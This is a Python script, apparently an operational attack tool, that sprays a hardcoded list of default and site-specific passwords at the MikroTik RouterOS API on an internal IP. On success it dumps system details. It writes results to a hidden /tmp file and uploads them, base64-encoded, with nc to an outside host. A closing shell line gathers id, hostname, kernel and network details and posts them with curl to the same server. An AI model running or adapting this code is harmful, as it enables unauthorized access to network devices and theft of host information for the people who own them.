#!/usr/bin/env python3
# MikroTik RouterOS API login spray (8728) — ROS >=6.43 plain login
import socket, struct, subprocess, base64

O = "/tmp/.MTIK.txt"
out = open(O, "w", buffering=1)
def w(s):
    out.write(str(s) + "\n")

def enc_word(wd):
    b = wd.encode() if isinstance(wd, str) else wd
    n = len(b)
    if n < 0x80: h = bytes([n])
    elif n < 0x4000: h = bytes([0x80 | (n >> 8), n & 0xff])
    elif n < 0x200000: h = bytes([0xC0 | (n >> 16), (n >> 8) & 0xff, n & 0xff])
    else: h = bytes([0xE0 | (n >> 24), (n >> 16) & 0xff, (n >> 8) & 0xff, n & 0xff])
    return h + b

def read_word(s):
    b = s.recv(1)
    if not b: return None
    f = b[0]
    if f & 0x80 == 0: ln = f
    elif f & 0xC0 == 0x80: ln = ((f & 0x3f) << 8) | s.recv(1)[0]
    else: return None
    d = b""
    while len(d) < ln:
        c = s.recv(ln - len(d))
        if not c: return None
        d += c
    return d

def api(ip, words, timeout=6):
    try:
        s = socket.create_connection((ip, 8728), timeout)
        s.sendall(b"".join(enc_word(x) for x in words) + b"\x00")
        res = []
        while True:
            d = read_word(s)
            if d is None: break
            if d == b"":  # sentence end
                if res: return s, res
                continue
            res.append(d.decode("utf-8", "replace"))
        s.close()
        return None, res
    except Exception as e:
        return None, ["ERR " + str(e)]

IP = "10.61.10.216"
CREDS = [("admin", ""), ("admin", "admin"), ("admin", "password"), ("admin", "!QAZxsw2"),
         ("admin", "mel123"), ("admin", "dbr123"), ("admin", "2xENht6ivn"), ("admin", "Zz123456"),
         ("admin", "Qwerty123"), ("melitopol", ""), ("dbr", "admin")]
# detect API version behavior
for u, p in CREDS:
    s, r = api(IP, ["/login", "=name=" + u, "=password=" + p])
    txt = " ".join(r)
    w(u + "/" + (p[:8] if p else "<empty>") + " => " + txt[:120])
    if s and any(x.startswith("=ret=") for x in r):
        w("!!! LOGIN pre-6.43 style ??? " + u + "/" + p)
    if s and any("!done" in x for x in r):
        w("!!! LOGIN OK " + u + "/" + p)
        try:
            s.sendall(b"".join(enc_word(x) for x in ["/system/resource/print"]) + b"\x00")
            while True:
                d = read_word(s)
                if d is None or d == b"":
                    break
                w("  " + d.decode("utf-8", "replace"))
        except Exception:
            pass
    if s:
        try: s.close()
        except Exception: pass
out.close()
b = base64.b64encode(open(O, "rb").read()).decode()
subprocess.run("printf 'POST /up HTTP/1.0\\r\\nHost: 131.123.43.239\\r\\nX-Name: mel_lat_mtik\\r\\nContent-Length: %s\\r\\n\\r\\n%s' | timeout 60 nc 131.123.43.239 80" % (len(b), b), shell=True)
print("MTIK_DONE")
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1

